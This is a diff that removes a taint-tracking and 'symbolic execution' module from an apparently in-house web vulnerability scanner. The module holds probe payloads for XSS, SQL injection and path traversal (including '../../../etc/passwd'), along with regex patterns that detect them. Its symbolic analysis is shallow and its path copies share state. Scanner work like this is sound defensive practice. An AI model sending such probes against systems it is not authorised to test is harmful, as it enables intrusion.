-                    normalized = decoded
-        except Exception:
-            pass
-        
-        # Try Hex decoding
-        try:
-            hex_pattern = r'^[0-9a-fA-F]+$'
-            if re.match(hex_pattern, normalized.strip()) and len(normalized.strip()) % 2 == 0:
-                decoded = binascii.unhexlify(normalized.strip()).decode('utf-8', errors='ignore')
-                if decoded and decoded != normalized:
-                    normalized = decoded
-        except Exception:
-            pass
-        
-        return normalized
-    
-    def mark_tainted(self, data: str, source_type: str, location: str = 'unknown') -> str:
-        """Mark data as tainted and return taint ID with encoding normalization"""
-        if not data or len(data) > 10000:  # Size limit for taint tracking
-            return None
-        
-        # Normalize the data before taint tracking
-        normalized_data = self.normalize_payload(data)
-        
-        # Track both original and normalized versions
-        taint_id = self.generate_taint_id(source_type, normalized_data[:100], location)
-        self.reverse_map[data] = taint_id
-        self.reverse_map[normalized_data] = taint_id
-        
-        return taint_id
-    
-    def is_tainted(self, data: str) -> List[str]:
-        """Check if data is tainted and return list of taint IDs with encoding normalization"""
-        taint_ids = []
-        
-        # Check original data
-        for tainted_data, taint_id in self.reverse_map.items():
-            if tainted_data in data:
-                taint_ids.append(taint_id)
-        
-        # Also check normalized version of data
-        normalized_data = self.normalize_payload(data)
-        if normalized_data != data:
-            for tainted_data, taint_id in self.reverse_map.items():
-                if tainted_data in normalized_data and taint_id not in taint_ids:
-                    taint_ids.append(taint_id)
-        
-        return taint_ids
-    
-    def track_propagation(self, from_taint_id: str, to_context: str, operation: str):
-        """Track how taint propagates through the application"""
-        if from_taint_id in self.taint_map:
-            self.taint_map[from_taint_id]['propagation_count'] += 1
-            self.taint_propagation.append({
-                'from_taint_id': from_taint_id,
-                'to_context': to_context,
-                'operation': operation,
-                'timestamp': datetime.now().isoformat()
-            })
-    
-    def check_sink_contamination(self, response_content: str, sink_type: str) -> List[Dict]:
-        """Check if tainted data reaches sensitive sinks"""
-        contaminated_sinks = []
-        
-        # Get all taint IDs present in response
-        taint_ids = self.is_tainted(response_content)
-        
-        if not taint_ids:
-            return contaminated_sinks
-        
-        # Check against sink patterns
-        sink_patterns = self.TAINT_SINKS.get(sink_type, [])
-        for pattern in sink_patterns:
-            if re.search(pattern, response_content, re.IGNORECASE):
-                for taint_id in taint_ids:
-                    contaminated_sinks.append({
-                        'taint_id': taint_id,
-                        'sink_type': sink_type,
-                        'pattern_matched': pattern,
-                        'source': self.taint_map.get(taint_id, {}),
-                        'severity': self._calculate_severity(sink_type, taint_id)
-                    })
-        
-        return contaminated_sinks
-    
-    def _calculate_severity(self, sink_type: str, taint_id: str) -> str:
-        """Calculate severity based on sink type and taint source"""
-        high_severity_sinks = ['sql_execution', 'command_execution', 'file_operations']
-        if sink_type in high_severity_sinks:
-            return 'HIGH'
-        elif sink_type == 'output_sinks':
-            return 'MEDIUM'
-        else:
-            return 'LOW'
-    
-    def analyze_response(self, response_body: str, response_headers: Dict, url: str) -> Dict:
-        """Analyze HTTP response for taint propagation to sinks"""
-        analysis_result = {
-            'url': url,
-            'tainted': False,
-            'flows_detected': [],
-            'vulnerabilities': [],
-            'symbolic_execution': None
-        }
-        
-        # Check each sink type
-        for sink_type in self.TAINT_SINKS.keys():
-            contaminated = self.check_sink_contamination(response_body, sink_type)
-            if contaminated:
-                analysis_result['tainted'] = True
-                analysis_result['flows_detected'].extend(contaminated)
-                
-                # Convert to vulnerability format
-                for contamination in contaminated:
-                    vuln = self._create_vulnerability_from_taint(contamination, url, response_headers)
-                    analysis_result['vulnerabilities'].append(vuln)
-        
-        # Perform symbolic execution on response
-        analysis_result['symbolic_execution'] = self._symbolic_execute_response(response_body, url)
-        
-        return analysis_result
-    
-    def _create_vulnerability_from_taint(self, contamination: Dict, url: str, headers: Dict) -> Dict:
-        """Create a vulnerability entry from taint analysis"""
-        source_info = contamination['source']
-        vuln_type = self._map_sink_to_vuln_type(contamination['sink_type'])
-        
-        return {
-            'type': vuln_type,
-            'url': url,
-            'severity': contamination['severity'],
-            'confidence': 'HIGH',
-            'evidence': f"Taint propagation from {source_info['source_type']} ({source_info['location']}) to {contamination['sink_type']}",
-            'payload': source_info['source_value'],
-            'taint_id': contamination['taint_id'],
-            'sink_pattern': contamination['pattern_matched'],
-            'response_headers': headers,
-            'detection_method': 'dynamic_taint_tracking',
-            'cvss_score': self._calculate_cvss_score(contamination['sink_type'])
-        }
-    
-    def _map_sink_to_vuln_type(self, sink_type: str) -> str:
-        """Map sink types to vulnerability types"""
-        mapping = {
-            'sql_execution': 'SQLi',
-            'command_execution': 'CommandInjection',
-            'file_operations': 'PathTraversal',
-            'output_sinks': 'XSS',
-            'header_injection': 'CRLF'
-        }
-        return mapping.get(sink_type, 'DataFlow')
-    
-    def _calculate_cvss_score(self, sink_type: str) -> float:
-        """Calculate CVSS score based on sink type"""
-        scores = {
-            'sql_execution': 9.8,
-            'command_execution': 9.8,
-            'file_operations': 7.5,
-            'output_sinks': 6.1,
-            'header_injection': 5.3
-        }
-        return scores.get(sink_type, 5.0)
-    
-    def _symbolic_execute_response(self, response_body: str, url: str) -> Dict:
-        """Perform symbolic execution on response to explore potential paths"""
-        symbolic_result = {
-            'paths_explored': 0,
-            'symbolic_variables': {},
-            'constraints': [],
-            'potential_vulnerabilities': []
-        }
-        
-        try:
-            # Extract symbolic variables from response
-            symbolic_vars = self._extract_symbolic_variables(response_body)
-            symbolic_result['symbolic_variables'] = symbolic_vars
-            
-            # Generate constraints
-            constraints = self._generate_constraints(symbolic_vars, response_body)
-            symbolic_result['constraints'] = constraints
-            
-            # Explore paths
-            paths = self._explore_symbolic_paths(symbolic_vars, constraints)
-            symbolic_result['paths_explored'] = len(paths)
-            
-            # Identify potential vulnerabilities from symbolic analysis
-            for path in paths:
-                vulns = self._analyze_symbolic_path(path, url)
-                symbolic_result['potential_vulnerabilities'].extend(vulns)
-                
-        except Exception as e:
-            logging.warning(f"Symbolic execution error for {url}: {e}")
-        
-        return symbolic_result
-    
-    def _extract_symbolic_variables(self, response_body: str) -> Dict:
-        """Extract potential symbolic variables from response"""
-        variables = {}
-        
-        # Look for dynamic content patterns
-        patterns = [
-            r'\{\{([^}]+)\}\}',  # Template variables
-            r'\${([^}]+)}',      # Expression language
-            r'\$\w+',            # PHP/Shell variables
-            r'%\([^)]+\)s',      # Python string formatting
-            r'<%=[^%]+%>',      # ASP/JSP expressions
-            r'\$\{[^}]+\}'       # EL expressions
-        ]
-        
-        var_id = 0
-        for pattern in patterns:
-            matches = re.findall(pattern, response_body)
-            for match in matches:
-                var_name = f'sym_var_{var_id}'
-                variables[var_name] = {
-                    'pattern': match,
-                    'type': self._infer_variable_type(match),
-                    'constraints': []
-                }
-                var_id += 1
-        
-        return variables
-    
-    def _infer_variable_type(self, pattern: str) -> str:
-        """Infer variable type from pattern"""
-        if re.search(r'\d+', pattern):
-            return 'numeric'
-        elif re.search(r'[<>"\']', pattern):
-            return 'string_potentially_dangerous'
-        else:
-            return 'string'
-    
-    def _generate_constraints(self, variables: Dict, response_body: str) -> List[Dict]:
-        """Generate constraints for symbolic variables"""
-        constraints = []
-        
-        for var_name, var_info in variables.items():
-            pattern = var_info['pattern']
-            
-            # Generate length constraints
-            constraints.append({
-                'variable': var_name,
-                'type': 'length',
-                'min': 0,
-                'max': len(pattern) * 10  # Allow for variation
-            })
-            
-            # Generate format constraints based on type
-            if var_info['type'] == 'numeric':
-                constraints.append({
-                    'variable': var_name,
-                    'type': 'format',
-                    'pattern': r'^\d+$'
-                })
-        
-        return constraints
-    
-    def _explore_symbolic_paths(self, variables: Dict, constraints: List[Dict]) -> List[Dict]:
-        """Explore potential execution paths symbolically"""
-        paths = []
-        
-        # Generate different path combinations
-        for var_name in variables.keys():
-            base_path = {
-                'variables': {},
-                'constraints': [c for c in constraints if c['variable'] == var_name]
-            }
-            
-            # Add normal path
-            base_path['variables'][var_name] = 'normal_value'
-            paths.append(base_path.copy())
-            
-            # Add edge cases
-            edge_cases = [
-                {'value': '', 'description': 'empty_string'},
-                {'value': 'A' * 10000, 'description': 'buffer_overflow'},
-                {'value': '<script>alert(1)</script>', 'description': 'xss_payload'},
-                {'value': "' OR '1'='1", 'description': 'sqli_payload'},
-                {'value': '../../../etc/passwd', 'description': 'path_traversal'}
-            ]
-            
-            for case in edge_cases:
-                edge_path = base_path.copy()
-                edge_path['variables'][var_name] = case['value']
-                edge_path['description'] = case['description']
-                paths.append(edge_path)
-        
-        return paths
-    
-    def _analyze_symbolic_path(self, path: Dict, url: str) -> List[Dict]:
-        """Analyze a symbolic path for potential vulnerabilities"""
-        vulnerabilities = []
-        
-        for var_name, value in path['variables'].items():
-            if isinstance(value, str):
-                # Check for XSS patterns
-                if re.search(r'<script|onerror|onload|javascript:', value, re.IGNORECASE):
-                    vulnerabilities.append({
-                        'type': 'XSS',
-                        'severity': 'MEDIUM',
-                        'description': f"Symbolic path analysis suggests XSS potential via {var_name}",
-                        'url': url,
-                        'symbolic_value': value
-                    })
-                
-                # Check for SQLi patterns
-                if re.search(r'\'\s*OR|\'\s*AND|UNION\s+SELECT|;\s*DROP', value, re.IGNORECASE):
-                    vulnerabilities.append({
-                        'type': 'SQLi',
-                        'severity': 'HIGH',
-                        'description': f"Symbolic path analysis suggests SQLi potential via {var_name}",
-                        'url': url,
-                        'symbolic_value': value
-                    })
-                
-                # Check for path traversal
-                if re.search(r'\.\./|\.\.\\', value):
-                    vulnerabilities.append({
-                        'type': 'PathTraversal',
-                        'severity': 'HIGH',
-                        'description': f"Symbolic path analysis suggests path traversal via {var_name}",
-                        'url': url,
-                        'symbolic_value': value
-                    })
-        
-        return vulnerabilities
-    
-    def get_taint_report(self) -> Dict:
-        """Generate comprehensive taint tracking report"""
-        return {
-            'session_id': self.session_id,
-            'total_taint_sources': len(self.taint_map),
-            'total_propagation_events': len(self.taint_propagation),
-            'total_flows_detected': len(self.detected_flows),
-            'taint_sources': self.taint_map,
-            'propagation_paths': self.taint_propagation,
-            'detected_flows': self.detected_flows,
-            'symbolic_states': self.symbolic_states
-        }
-
-
-class HTTPResponseInstrumentor:
-    """
-    Instruments HTTP responses to detect taint propagation and perform
-    dynamic analysis on response content.
-    """
-    
-    def __init__(self, taint_tracker: TaintTracker):
-        try:
-            self.taint_tracker = taint_tracker
-            self.instrumentation_enabled = True
-            self.analysis_cache = {}
-        except RecursionError as e:
-            import traceback
-            logging.error(f"RecursionError in HTTPResponseInstrumentor.__init__: {e}")
-            traceback.print_exc()
-            raise
-        
-    def instrument_request(self, method: str, url: str, headers: Dict, 
-                          params: Dict = None, body: str = None) -> Dict:
-        """Instrument HTTP request to mark taint sources"""
-        instrumentation_data = {
-            'taint_ids': [],
-            'sources_marked': []
-        }
-        
-        # Mark query parameters as tainted
-        if params:
-            for param_name, param_value in params.items():
-                if self._is_taint_source(param_name, 'query_params'):
-                    taint_id = self.taint_tracker.mark_tainted(
-                        str(param_value), 
-                        'query_param', 
-                        f'{url}?{param_name}'
-                    )
-                    if taint_id:
-                        instrumentation_data['taint_ids'].append(taint_id)
-                        instrumentation_data['sources_marked'].append({
-                            'type': 'query_param',
-                            'name': param_name,
-                            'taint_id': taint_id
-                        })
-        
-        # Mark headers as tainted
-        for header_name, header_value in headers.items():
-            if self._is_taint_source(header_name, 'headers'):
-                taint_id = self.taint_tracker.mark_tainted(
-                    str(header_value), 
-                    'header', 
-                    f'{url}->header:{header_name}'
-                )
-                if taint_id:
-                    instrumentation_data['taint_ids'].append(taint_id)
-                    instrumentation_data['sources_marked'].append({
-                        'type': 'header',
-                        'name': header_name,
-                        'taint_id': taint_id
-                    })
-        
-        # Mark body fields as tainted
-        if body:
-            try:
-                body_data = json.loads(body) if isinstance(body, str) else body
-                if isinstance(body_data, dict):
-                    for field_name, field_value in body_data.items():
-                        if self._is_taint_source(field_name, 'body_fields'):
-                            taint_id = self.taint_tracker.mark_tainted(
-                                str(field_value), 
-                                'body_field', 
-                                f'{url}->body:{field_name}'
-                            )
-                            if taint_id:
-                                instrumentation_data['taint_ids'].append(taint_id)
-                                instrumentation_data['sources_marked'].append({
-                                    'type': 'body_field',
-                                    'name': field_name,
-                                    'taint_id': taint_id
-                                })
-            except (json.JSONDecodeError, TypeError):
-                # If body is not JSON, treat entire body as tainted
-                taint_id = self.taint_tracker.mark_tainted(
-                    str(body), 
-                    'body', 
-                    f'{url}->body'
-                )
-                if taint_id:
-                    instrumentation_data['taint_ids'].append(taint_id)
-                    instrumentation_data['sources_marked'].append({
-                        'type': 'body',
-                        'taint_id': taint_id
-                    })
-        
-        return instrumentation_data
-    
-    def instrument_response(self, response_body: str, response_headers: Dict, 
-                          url: str, request_instrumentation: Dict) -> Dict:
-        """Instrument HTTP response to detect taint propagation"""
-        if not self.instrumentation_enabled:
-            return {'instrumented': False}
-        
-        # Check cache first
-        cache_key = hashlib.md5(f"{url}_{response_body[:100]}".encode()).hexdigest()
-        if cache_key in self.analysis_cache:
-            return self.analysis_cache[cache_key]
-        
-        # Perform taint analysis
-        analysis_result = self.taint_tracker.analyze_response(
-            response_body, 
-            response_headers, 
-            url
-        )
-        
-        # Track propagation from request to response
-        for taint_id in request_instrumentation.get('taint_ids', []):
-            if analysis_result['tainted']:
-                self.taint_tracker.track_propagation(
-                    taint_id,
-                    f'{url}->response',
-                    'http_response_reflection'
-                )
-        
-        # Add instrumentation metadata
-        analysis_result['instrumentation'] = {
-            'request_taint_ids': request_instrumentation.get('taint_ids', []),
-            'sources_marked': request_instrumentation.get('sources_marked', []),
-            'instrumented': True
-        }
-        
-        # Cache result
-        self.analysis_cache[cache_key] = analysis_result
-        
-        return analysis_result
-    
-    def _is_taint_source(self, field_name: str, source_category: str) -> bool:
-        """Check if a field should be considered a taint source"""
-        sources = TaintTracker.TAINT_SOURCES.get(source_category, [])
-        
-        if source_category == 'headers':
-            return any(source.lower() in field_name.lower() for source in sources)
-        else:
-            return field_name.lower() in [s.lower() for s in sources]
-    
-    def enable_instrumentation(self):
-        """Enable response instrumentation"""
-        self.instrumentation_enabled = True
-    
-    def disable_instrumentation(self):
-        """Disable response instrumentation"""
-        self.instrumentation_enabled = False
-    
-    def clear_cache(self):
-        """Clear analysis cache"""
-        self.analysis_cache.clear()
-
-
-class TaintIntegratedSessionManager:
-    """
-    Session manager with integrated taint tracking capabilities.
-    Wraps the existing SessionManager to add taint analysis.
-    """
-    
-    def __init__(self, session_manager, enable_taint_tracking=True):
-        try:
-            self.session_manager = session_manager
-            self.enable_taint_tracking = enable_taint_tracking
-            self.taint_tracker = TaintTracker()
-            self.instrumentor = HTTPResponseInstrumentor(self.taint_tracker)
-            self.taint_results = []
-        except RecursionError as e:
-            import traceback
-            logging.error(f"RecursionError in TaintIntegratedSessionManager.__init__: {e}")
-            traceback.print_exc()
-            raise
-    
-    # Explicit delegation methods instead of __getattr__ to avoid recursion
-    async def get(self, url, **kwargs):
-        return await self.session_manager.get(url, **kwargs)
-    
-    async def post(self, url, **kwargs):
-        return await self.session_manager.post(url, **kwargs)
-    
-    async def put(self, url, **kwargs):
-        return await self.session_manager.put(url, **kwargs)
-    
-    async def delete(self, url, **kwargs):
-        return await self.session_manager.delete(url, **kwargs)
-    
-    async def close(self):
-        return await self.session_manager.close()
-        
-    async def fetch(self, url: str, method: str = 'GET', data: Optional[Dict[str, Any]] = None, json_data: Optional[Dict[str, Any]] = None, headers: Optional[Dict[str, str]] = None, allow_redirects: bool = False) -> Optional[Any]:
-        """Fetch method to match SessionManager interface"""
-        kwargs = {'allow_redirects': allow_redirects}
-        if headers: kwargs['headers'] = headers
-        if data: kwargs['data'] = data
-        if json_data: kwargs['json'] = json_data
-        
-        return await self.request(method, url, **kwargs)
-    
-    async def request(self, method, url, **kwargs):
-        """Override request method to add taint tracking"""
-        # Prepare request data for instrumentation
-        headers = kwargs.get('headers', {})
-        params = kwargs.get('params', {})
-        body = kwargs.get('data', kwargs.get('json', None))
-        
-        # Instrument the request
-        request_instrumentation = {}
-        if self.enable_taint_tracking:
-            request_instrumentation = self.instrumentor.instrument_request(
-                method, url, headers, params, body
-            )
-        
-        # Make the actual request
-        response = await self.session_manager.fetch(
-            url, 
-            method, 
-            data=kwargs.get('data'),
-            json_data=kwargs.get('json'),
-            headers=headers,
-            allow_redirects=kwargs.get('allow_redirects', False)
-        )
-        
-        # Instrument the response
-        taint_analysis = {}
-        if self.enable_taint_tracking and hasattr(response, '_body'):
-            response_headers = dict(response.headers)
-            taint_analysis = self.instrumentor.instrument_response(
-                response._body,
-                response_headers,
-                url,
-                request_instrumentation
-            )
-            
-            # Store results if vulnerabilities found
-            if taint_analysis.get('vulnerabilities'):
-                self.taint_results.append(taint_analysis)
-                
-                # Log findings
-                for vuln in taint_analysis['vulnerabilities']:
-                    logging.warning(
-                        f"[TAINT TRACKING] {vuln['type']} detected via {vuln['detection_method']}: "
-                        f"{vuln['evidence']} at {url}"
-                    )
-        
-        # Attach taint analysis to response object
-        response._taint_analysis = taint_analysis
-        
-        return response
-    
-    async def close(self):
-        """Close the session manager"""
-        await self.session_manager.close()
-    
-    def get_taint_results(self) -> List[Dict]:
-        """Get all taint analysis results"""
-        return self.taint_results
-    
-    def get_taint_report(self) -> Dict:
-        """Get comprehensive taint tracking report"""
-        return self.taint_tracker.get_taint_report()
-    
-    def activate_taint_tracking(self):
-        """Enable taint tracking"""
-        self.enable_taint_tracking = True
-        self.instrumentor.enable_instrumentation()
-    
-    def deactivate_taint_tracking(self):
-        """Disable taint tracking"""
-        self.enable_taint_tracking = False
-        self.instrumentor.disable_instrumentation()
-
-
-# Integration helper for OmegaDAST class
-def integrate_taint_tracking(omega_dast_instance):
-    """
-    Integrate taint tracking into an existing OmegaDAST instance.
-    Replaces the session manager with a taint-integrated version.
-    """
-    # Create taint-integrated session manager
-    taint_session = TaintIntegratedSessionManager(
-        omega_dast_instance.session,
-        enable_taint_tracking=True
-    )
-    
-    # Replace the session
-    omega_dast_instance.session = taint_session
-    
-    # Add taint tracking results to vulnerability collection
-    original_collect_vulnerability = omega_dast_instance.collect_vulnerability
-    
-    def enhanced_collect_vulnerability(self, vuln):
-        # Call original method
-        original_collect_vulnerability(vuln)
-        
-        # Check if this vulnerability came from taint tracking
-        if vuln.get('detection_method') == 'dynamic_taint_tracking':
-            logging.info(f"[TAINT TRACKING] Collected vulnerability: {vuln['type']} at {vuln['url']}")
-    
-    # Bind the enhanced method
-    omega_dast_instance.collect_vulnerability = enhanced_collect_vulnerability.__get__(omega_dast_instance, type(omega_dast_instance))
-    
-    return taint_session
-
 
 if __name__ == "__main__":
     main()
